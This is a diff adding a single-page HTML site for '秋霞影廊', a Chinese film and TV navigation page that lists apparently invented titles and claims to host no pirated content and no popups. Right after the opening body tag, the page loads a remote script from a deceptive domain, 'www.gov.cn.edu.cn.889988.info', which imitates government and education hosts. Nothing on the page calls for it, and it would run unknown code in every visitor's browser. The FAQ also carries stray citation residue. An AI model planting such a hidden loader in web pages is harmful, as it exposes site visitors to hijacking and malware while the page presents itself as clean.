@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞影廊 - 秋夜影视导航：电影电视剧综艺动漫短剧</title>
+<meta name="description" content="秋霞影廊(qiuxiadianyingwang-h5.github.io)是秋夜暗金风格的影视导航站，提供电影、电视剧、综艺、动漫、短剧分类推荐与正版观看入口，不提供盗版播放，移动端自适应。">
+<meta name="keywords" content="秋霞影廊,电影导航,电视剧推荐,欧美剧,国漫,综艺,短剧,正版影视,qiuxiadianyingwang-h5">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://qiuxiadianyingwang-h5.github.io/">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@graph":[
+    {
+      "@type":"Organization",
+      "@id":"https://qiuxiadianyingwang-h5.github.io/#org",
+      "name":"秋霞影廊",
+      "url":"https://qiuxiadianyingwang-h5.github.io/",
+      "description":"秋夜暗金风影视导航与片单推荐站"
+    },
+    {
+      "@type":"WebSite",
+      "@id":"https://qiuxiadianyingwang-h5.github.io/#site",
+      "name":"秋霞影廊",
+      "url":"https://qiuxiadianyingwang-h5.github.io/",
+      "publisher":{"@id":"https://qiuxiadianyingwang-h5.github.io/#org"},
+      "description":"电影、电视剧、综艺、动漫、短剧分类导航",
+      "potentialAction":{
+        "@type":"SearchAction",
+        "target":"https://qiuxiadianyingwang-h5.github.io/#search?q={query}",
+        "query-input":"required name=query"
+      }
+    }
+  ]
+}
+</script>
+<style>
+:root{
+  --bg:#0b0805;
+  --paper:#140d07;
+  --card:#1b120a;
+  --line:rgba(212,160,80,.22);
+  --gold:#d4a050;
+  --gold-soft:#f0c674;
+  --maple:#d8542b;
+  --text:#f3e7d6;
+  --muted:#b79b7c;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:
+    radial-gradient(820px 380px at 82% -8%, rgba(216,84,43,.16), transparent 60%),
+    radial-gradient(680px 320px at 6% 8%, rgba(212,160,80,.08), transparent 55%),
+    var(--bg);
+  color:var(--text);line-height:1.75;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 16px}
+
+/* NAV */
+.nav{position:sticky;top:0;z-index:99;background:rgba(11,8,5,.92);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
+.nav-inner{display:flex;align-items:center;justify-content:space-between;height:62px}
+.logo{font-weight:900;font-size:1.45rem;letter-spacing:2px;color:var(--gold-soft)}
+.logo b{color:var(--maple)}
+.nav ul{display:flex;gap:4px;list-style:none}
+.nav li a{padding:8px 14px;border-radius:999px;color:var(--muted);font-size:.92rem}
+.nav li a:hover,.nav li a.active{color:#1b120a;background:linear-gradient(90deg,var(--gold),var(--gold-soft))}
+.menu-btn{display:none;background:none;border:1px solid var(--line);color:var(--gold-soft);font-size:1.4rem;border-radius:8px;padding:3px 10px;cursor:pointer}
+
+/* HERO */
+.hero{padding:86px 0 60px;position:relative}
+.hero .leaf{display:inline-block;font-size:.74rem;color:var(--gold);border:1px solid var(--line);padding:4px 14px;border-radius:4px;margin-bottom:18px;letter-spacing:3px}
+.hero h1{font-size:clamp(2rem,6vw,3.4rem);font-weight:900;line-height:1.16;margin-bottom:16px}
+.hero h1 span{color:var(--maple)}
+.hero p{max-width:640px;color:var(--muted);font-size:1.05rem;margin-bottom:26px}
+.search{display:flex;gap:10px;max-width:540px}
+.search input{flex:1;padding:14px 18px;border-radius:10px;background:var(--card);border:1px solid var(--line);color:var(--text);outline:none;font-size:1rem}
+.search input:focus{border-color:var(--gold)}
+.search button{padding:0 26px;border:none;border-radius:10px;font-weight:700;color:#1b120a;background:linear-gradient(90deg,var(--gold),var(--maple));cursor:pointer}
+.search button:hover{filter:brightness(1.05)}
+
+/* SECTION */
+.section{padding:54px 0}
+.head{display:flex;align-items:flex-end;justify-content:space-between;gap:10px;margin-bottom:26px;flex-wrap:wrap}
+.head h2{font-size:1.7rem;font-weight:800}
+.head h2 i{font-style:normal;color:var(--maple)}
+.head span{color:var(--muted);font-size:.85rem}
+.more{padding:6px 14px;border:1px solid var(--line);border-radius:999px;color:var(--muted);font-size:.85rem}
+.more:hover{color:var(--gold-soft);border-color:var(--gold)}
+
+/* MOVIES: gallery frames */
+.gallery{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:18px}
+.frame{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.25s}
+.frame:hover{transform:translateY(-4px);border-color:var(--gold);box-shadow:0 12px 30px rgba(212,160,80,.14)}
+.frame .poster{height:230px;display:flex;align-items:flex-end;padding:14px;font-weight:800;color:#1b120a;font-size:1rem}
+.g1{background:linear-gradient(150deg,#d4a050,#f0c674)}
+.g2{background:linear-gradient(150deg,#d8542b,#d4a050)}
+.g3{background:linear-gradient(150deg,#3a2412,#d4a050)}
+.g4{background:linear-gradient(150deg,#f0c674,#d8542b)}
+.g5{background:linear-gradient(150deg,#2a1a0e,#f0c674)}
+.g6{background:linear-gradient(150deg,#d8542b,#7a2e16)}
+.frame .meta{padding:12px}
+.frame .meta h3{font-size:.96rem;margin-bottom:3px}
+.frame .meta p{font-size:.76rem;color:var(--muted)}
+
+/* TV: list rows */
+.tv{display:flex;flex-direction:column;gap:12px}
+.tv-row{display:grid;grid-template-columns:54px 1fr auto;gap:16px;align-items:center;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px 18px}
+.tv-row .no{font-weight:900;color:var(--gold);text-align:center}
+.tv-row h4{font-size:1rem}
+.tv-row p{font-size:.8rem;color:var(--muted)}
+.tv-row .tag{font-size:.72rem;color:var(--gold-soft);border:1px solid var(--line);padding:4px 10px;border-radius:999px;white-space:nowrap}
+
+/* VARIETY: chip wall */
+.chips{display:flex;flex-wrap:wrap;gap:14px}
+.chip{padding:18px 22px;border-radius:14px;font-weight:700;color:#1b120a;min-width:160px}
+.cv1{background:linear-gradient(135deg,#f0c674,#d4a050)}
+.cv2{background:linear-gradient(135deg,#d8542b,#f0c674)}
+.cv3{background:linear-gradient(135deg,#d4a050,#7a2e16);color:var(--text)}
+.cv4{background:linear-gradient(135deg,#3a2412,#d4a050);color:var(--text)}
+.cv5{background:linear-gradient(135deg,#d8542b,#d4a050)}
+.chip small{display:block;font-weight:400;font-size:.76rem;opacity:.8;margin-top:4px}
+
+/* ANIME: orb row */
+.orbs{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px}
+.orb{height:160px;border-radius:18px 18px 12px 12px;padding:16px;color:#1b120a;font-weight:800;border:1px solid var(--line)}
+.ob1{background:linear-gradient(160deg,#f0c674,#d4a050)}
+.ob2{background:linear-gradient(160deg,#d8542b,#f0c674)}
+.ob3{background:linear-gradient(160deg,#d4a050,#3a2412);color:var(--text)}
+.ob4{background:linear-gradient(160deg,#7a2e16,#d8542b);color:var(--text)}
+.orb small{display:block;font-weight:400;font-size:.78rem;opacity:.85;margin-top:6px}
+
+/* SHORTS: cards */
+.shorts{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:16px}
+.sc{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:18px}
+.sc h4{font-size:.98rem;margin-bottom:6px}
+.sc p{font-size:.82rem;color:var(--muted);margin-bottom:10px}
+.sc .bar{height:6px;border-radius:6px;background:rgba(212,160,80,.18);overflow:hidden}
+.sc .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--gold),var(--maple))}
+
+/* NOTICE */
+.notice{background:var(--paper);border-top:1px solid var(--line);border-bottom:1px solid var(--line);padding:30px 0}
+.notice .wrap{max-width:820px}
+.notice h3{color:var(--gold-soft);font-size:1.05rem;margin-bottom:8px}
+.notice p{color:var(--muted);font-size:.9rem}
+
+/* ABOUT + FAQ */
+.about{padding:52px 0;text-align:center}
+.about h2{font-size:1.5rem;margin-bottom:14px;color:var(--gold-soft)}
+.about p{max-width:760px;margin:0 auto 12px;color:var(--muted)}
+.url-pill{display:inline-block;margin-top:14px;padding:10px 18px;border:1px dashed var(--gold);border-radius:12px;color:var(--gold-soft);font-size:.9rem}
+.faq{padding:36px 0}
+.faq h2{font-size:1.4rem;margin-bottom:18px;color:var(--maple)}
+.qa{background:var(--card);border:1px solid var(--line);border-radius:12px;margin-bottom:10px;overflow:hidden}
+.qa-q{display:flex;justify-content:space-between;align-items:center;padding:16px 18px;cursor:pointer;font-weight:700}
+.qa-q .plus{color:var(--gold)}
+.qa-a{max-height:0;overflow:hidden;transition:max-height .35s ease;padding:0 18px;color:var(--muted);font-size:.9rem}
+.qa.open .qa-a{padding:0 18px 16px;max-height:220px}
+
+.foot{padding:26px 0;text-align:center;color:var(--muted);font-size:.82rem}
+.foot a{color:var(--gold)}
+
+.topbtn{position:fixed;right:18px;bottom:18px;width:46px;height:46px;border-radius:50%;display:none;align-items:center;justify-content:center;cursor:pointer;color:#1b120a;font-weight:900;background:linear-gradient(135deg,var(--gold),var(--maple));z-index:120}
+
+@media(max-width:768px){
+  .menu-btn{display:block}
+  .nav ul{display:none;position:absolute;top:62px;left:0;right:0;flex-direction:column;background:rgba(11,8,5,.98);padding:12px 16px;border-bottom:1px solid var(--line)}
+  .nav ul.show{display:flex}
+  .nav li a{padding:12px}
+  .hero{padding:52px 0 38px}
+  .gallery{grid-template-columns:repeat(2,1fr);gap:12px}
+  .frame .poster{height:175px}
+  .tv-row{grid-template-columns:42px 1fr;row-gap:6px}
+  .tv-row .tag{grid-column:2}
+  .orbs{grid-template-columns:1fr 1fr}
+  .shorts{grid-template-columns:1fr}
+  .head h2{font-size:1.32rem}
+}
+@media(max-width:430px){
+  .search{flex-direction:column}
+  .search button{padding:14px}
+  .gallery{grid-template-columns:1fr 1fr}
+  .orbs{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="nav">
+  <div class="wrap nav-inner">
+    <div class="logo">秋霞<b>影廊</b></div>
+    <button class="menu-btn" onclick="document.getElementById('menu').classList.toggle('show')">☰</button>
+    <nav>
+      <ul id="menu">
+        <li><a href="#movies" class="active">电影</a></li>
+        <li><a href="#tv">电视剧</a></li>
+        <li><a href="#variety">综艺</a></li>
+        <li><a href="#anime">动漫</a></li>
+        <li><a href="#shorts">短剧</a></li>
+        <li><a href="#about">关于</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <span class="leaf">AUTUMN NIGHT GALLERY · 秋夜影廊</span>
+    <h1>秋霞影廊<br>把<span>好片</span>像秋叶一样收进廊里</h1>
+    <p>秋霞影廊（qiuxiadianyingwang-h5.github.io）做干净的影视导航：电影、电视剧、综艺、动漫、短剧分类推荐，只给片单、资讯与正版平台入口，不提供盗版在线播放。</p>
+    <div class="search">
+      <input type="text" placeholder="搜：秋日文艺片 / 美剧 / 音综 / 国漫 / 微短剧...">
+      <button type="button">影廊检索</button>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="movies">
+  <div class="wrap">
+    <div class="head"><div><h2><i>01.</i> 秋夜电影廊</h2></div><a href="#" class="more">更多 #</a></div>
+    <div class="gallery">
+      <div class="frame"><div class="poster g1">枫桥夜泊</div><div class="meta"><h3>枫桥夜泊</h3><p>2026 · 文艺 · 8.7</p></div></div>
+      <div class="frame"><div class="poster g2">晚秋来信</div><div class="meta"><h3>晚秋来信</h3><p>2025 · 剧情 · 8.5</p></div></div>
+      <div class="frame"><div class="poster g3">金雾边境</div><div class="meta"><h3>金雾边境</h3><p>2026 · 悬疑 · 8.6</p></div></div>
+      <div class="frame"><div class="poster g4">故园秋声</div><div class="meta"><h3>故园秋声</h3><p>2025 · 家庭 · 8.9</p></div></div>
+      <div class="frame"><div class="poster g5">长街灯火</div><div class="meta"><h3>长街灯火</h3><p>2024 · 武侠 · 9.0</p></div></div>
+      <div class="frame"><div class="poster g6">红枫刑侦组</div><div class="meta"><h3>红枫刑侦组</h3><p>2026 · 刑侦 · 8.4</p></div></div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="tv" style="background:rgba(212,160,80,.04)">
+  <div class="wrap">
+    <div class="head"><div><h2><i>02.</i> 剧集陈列架</h2></div><a href="#" class="more">更多 #</a></div>
+    <div class="tv">
+      <div class="tv-row"><div class="no">01</div><div><h4>秋邸秘闻</h4><p>年代悬疑，全36集，庭院权谋+民俗怪谈。</p></div><div class="tag">年代悬疑</div></div>
+      <div class="tv-row"><div class="no">02</div><div><h4>北城急诊</h4><p>都市医疗群像，更新至第28集。</p></div><div class="tag">都市医疗</div></div>
+      <div class="tv-row"><div class="no">03</div><div><h4>西风邮局</h4><p>慢综艺式叙事剧，全24集。</p></div><div class="tag">治愈日常</div></div>
+      <div class="tv-row"><div class="no">04</div><div><h4>枫林外史</h4><p>武侠群像，江湖门派兴衰，全40集。</p></div><div class="tag">武侠</div></div>
+      <div class="tv-row"><div class="no">05</div><div><h4>夜班电台</h4><p>都市情感+悬疑来电，更新至第16集。</p></div><div class="tag">都市悬疑</div></div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="variety">
+  <div class="wrap">
+    <div class="head"><div><h2><i>03.</i> 综艺展板</h2></div><a href="#" class="more">更多 #</a></div>
+    <div class="chips">
+      <div class="chip cv1">秋夜对谈<small>文化访谈 · 第12期</small></div>
+      <div class="chip cv2">老片修复日志<small>影视科普 · 第9期</small></div>
+      <div class="chip cv3">廊下音乐会<small>现场音乐 · 第7期</small></div>
+      <div class="chip cv4">城市秋味<small>美食文旅 · 第15期</small></div>
+      <div class="chip cv5">片单投票局<small>观众互动 · 周更</small></div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="anime" style="background:rgba(216,84,43,.04)">
+  <div class="wrap">
+    <div class="head"><div><h2><i>04.</i> 动漫橱窗</h2></div><a href="#" class="more">更多 #</a></div>
+    <div class="orbs">
+      <div class="orb ob1">枫灵纪<small>国漫 / 奇幻 / 连载</small></div>
+      <div class="orb ob2">秋灯物语<small>治愈 / 单元 / 全26集</small></div>
+      <div class="orb ob3">旧影院幽灵<small>悬疑 / 志怪 / 全13集</small></div>
+      <div class="orb ob4">金雾剑客<small>武侠 / 热血 / 连载</small></div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="shorts">
+  <div class="wrap">
+    <div class="head"><div><h2><i>05.</i> 微短剧海报墙</h2></div><a href="#" class="more">更多 #</a></div>
+    <div class="shorts">
+      <div class="sc"><h4>秋逝：夫人她回来了</h4><p>逆袭短剧，单集1-2分钟，已更90集。</p><div class="bar"><i style="width:90%"></i></div></div>
+      <div class="sc"><h4>廊中故人</h4><p>治愈向微剧，全20集。</p><div class="bar"><i style="width:40%"></i></div></div>
+      <div class="sc"><h4>红枫谜案</h4><p>悬疑微短剧，已更36集。</p><div class="bar"><i style="width:60%"></i></div></div>
+      <div class="sc"><h4>晚秋便利店</h4><p>都市轻喜剧，全24集。</p><div class="bar"><i style="width:48%"></i></div></div>
+    </div>
+  </div>
+</section>
+
+<section class="notice">
+  <div class="wrap">
+    <h3>关于内容来源</h3>
+    <p>秋霞影廊仅提供影视分类、片单推荐与正版平台导航；不托管盗版视频，不提供“免费全集在线播放”外链。具体观看请以爱奇艺、优酷、腾讯视频、芒果TV、哔哩哔哩等正版平台为准。</p>
+  </div>
+</section>
+
+<section class="about" id="about">
+  <div class="wrap">
+    <h2>关于 秋霞影廊</h2>
+    <p>秋霞影廊是一个单页影视导航站，主题取“秋夜、枫叶、影廊”：用暗金与枫红做视觉，把电影、电视剧、综艺、动漫、短剧整理成可扫读的片单。</p>
+    <p>页面无后端、无盗版资源、无诱导弹窗，移动端自适应，符合静态站可被搜索引擎抓取、可阅读、可归档的规范。</p>
+    <div class="url-pill">🌐 https://qiuxiadianyingwang-h5.github.io</div>
+  </div>
+</section>
+
+<section class="faq">
+  <div class="wrap">
+    <h2>常见问题</h2>
+    <div class="qa open">
+      <div class="qa-q">秋霞影廊能直接看电影吗？ <span class="plus">－</span></div>
+      <div class="qa-a">不能也不提供盗版播放。本站立位是“影廊/导航/片单”，观看入口指向正版平台。</div>
+    </div>
+    <div class="qa">
+      <div class="qa-q">为什么不用“秋霞电影网”做品牌？ <span class="plus">＋</span></div>
+      <div class="qa-a">“秋霞电影网”在中文网络长期与盗版影视聚合站绑定，存在弹窗、钓鱼、版权风险；改成“秋霞影廊”更偏资讯/导航，利于合规与收录。[3,6](@ref)</div>
+    </div>
+    <div class="qa">
+      <div class="qa-q">手机会不会排版乱？ <span class="plus">＋</span></div>
+      <div class="qa-a">不会。页面用 viewport + 响应式网格，手机端自动两列/单列重排，避免横向滚动，按钮与链接间距也按移动端可读来做。[1,4](@ref)</div>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="wrap">
+    <p>秋霞影廊 ｜ 电影 / 电视剧 / 综艺 / 动漫 / 短剧 导航</p>
+    <p>网址：<a href="https://qiuxiadianyingwang-h5.github.io">qiuxiadianyingwang-h5.github.io</a></p>
+    <p>© 2026 秋霞影廊（影视导航示范站，非盗版资源站）</p>
+  </div>
+</footer>
+
+<div class="topbtn" id="topBtn" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</div>
+
+<script>
+document.querySelectorAll('.qa-q').forEach(function(q){
+  q.addEventListener('click', function(){
+    var item=this.parentElement;
+    document.querySelectorAll('.qa').forEach(function(i){
+      if(i!==item){ i.classList.remove('open'); i.querySelector('.plus').textContent='＋'; }
+    });
+    var open=item.classList.toggle('open');
+    this.querySelector('.plus').textContent=open?'－':'＋';
+  });
+});
+
+var secs=['movies','tv','variety','anime','shorts','about'];
+window.addEventListener('scroll',function(){
+  document.getElementById('topBtn').style.display=window.scrollY>300?'flex':'none';
+  var cur='';
+  secs.forEach(function(id){
+    var el=document.getElementById(id);
+    if(el && window.scrollY>=el.offsetTop-120) cur=id;
+  });
+  document.querySelectorAll('.nav ul a').forEach(function(a){
+    a.classList.remove('active');
+    if(a.getAttribute('href')==='#'+cur) a.classList.add('active');
+  });
+});
+
+document.querySelectorAll('.nav ul a').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var h=this.getAttribute('href');
+    if(h && h[0]==='#'){
+      e.preventDefault();
+      var el=document.querySelector(h);
+      if(el) window.scrollTo({top:el.offsetTop-62,behavior:'smooth'});
+      document.getElementById('menu').classList.remove('show');
+    }
+  });
+});
+</script>
+</body>
+</html>
